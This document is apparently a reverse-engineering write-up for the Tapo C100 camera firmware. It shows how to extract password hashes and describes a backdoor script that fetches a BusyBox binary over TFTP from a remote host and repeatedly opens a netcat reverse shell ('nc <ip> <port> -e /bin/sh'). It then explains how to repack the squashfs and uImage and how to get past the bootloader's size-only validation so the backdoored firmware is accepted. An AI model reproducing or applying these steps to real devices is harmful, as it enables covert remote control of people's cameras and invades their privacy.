# Tapo C100 reverse engineering

## How to obtain passwd and shadow files?

> After extracting the firmware with `binwalk`, search the extracted
> filesystem for password entries by looking for lines that start with
> `root:`.

```console
~ grep -ar "^root:" <path-to-extraction-dir>
```

## Backdoor script

> This shell script waits for network connectivity, downloads a BusyBox
> binary via TFTP, and repeatedly attempts to establish a reverse shell
> connection to a remote host.

### Step-by-step behavior

1. **Waits for internet access**

   > The script continuously pings `google.com` until a response is received,
   > indicating that network connectivity is available.

2. **Downloads payload**

   > Once the network is up, the script changes to the `/tmp` directory and
   > downloads a MIPS little-endian BusyBox binary from a TFTP server.

   ```sh
   tftp -g <ip-address> -r busybox-mipsel
   ```

3. **Makes the binary executable**

   > The downloaded file is marked as executable so it can be run.

   ```sh
   chmod +x busybox-mipsel
   ```

4. **Establishes a reverse shell**

   > The script enters an infinite loop and repeatedly attempts to connect
   > back to a remote host using netcat, spawning a shell on successful
   > connection.

   ```sh
   ./busybox-mipsel nc <ip-address> <port> -e /bin/sh
   ```

## Make squashfs filesystem

> Display filesystem superblock information

```console
~ unsquashfs -s <old-squashfs>
```

> Make squashfs with backdoor.sh script

```console
~ mksquashfs <unsquashed-filesystem> <new-squashfs> -comp <compression> -b <block size>
```

## Make image

```console
~ mkimage -A <arch> -O <os> -T <type> -C <compresion> -a <addr> -e <entry> -n <name> -d <input> <output>
```

## Merge uimage part with modified squashfs

```console
~ dd if=<uimage_part> of=<final_image> bs=1 count=<number-of-bytes>
~ dd if=<squashfs_part> of=<final_image> bs=1 seek=$((<hex-address>))
```

## SquashFS validation by size

> The bootloader validates the SquashFS (rootfs) partition **by size**, not by content(?).
> During firmware validation, U-Boot checks that the compressed SquashFS image
> **exactly matches the size defined in the partition table (TP header)**.
>
> Because of this, any modification to files inside the SquashFS (even a single byte)
> will usually change the final compressed image size, causing validation to fail and
> the firmware to be rejected.
>
> To work around this, an audio file was modified inside the filesystem and then recompress SquashFS
> **until the resulting image has exactly the same size as the original**.
> This preserves the expected partition size while still allowing controlled content changes.

## Image Merge Script (`mrgimg.sh`)

> This script merges a binary firmware part into an existing base
> image at a specified offset, producing a new combined output image.
> It is commonly used in firmware reconstruction workflows where
> individual partitions must be reinserted into a full flash dump.

### Usage

```console
~ ./mrgimg.sh <part-to-merge> <size> <output-img>
```

## SquashFS Size-Tuning Script

> This Bash script repeatedly rebuilds a SquashFS filesystem and
> dynamically adjusts its contents until the resulting filesystem
> matches a **target size exactly**. It is useful when repacking firmware
> images that require a SquashFS partition to have a **precise byte
> length** (e.g., fixed-offset flash layouts).
>
> The script runs in a loop, incrementally adding or removing data from a
> file inside the filesystem until the desired size is reached.

```console
./tunesquashfs <squashfs-root-dir> <block-size> <compression> <expected-size> <squashfs-output>
```
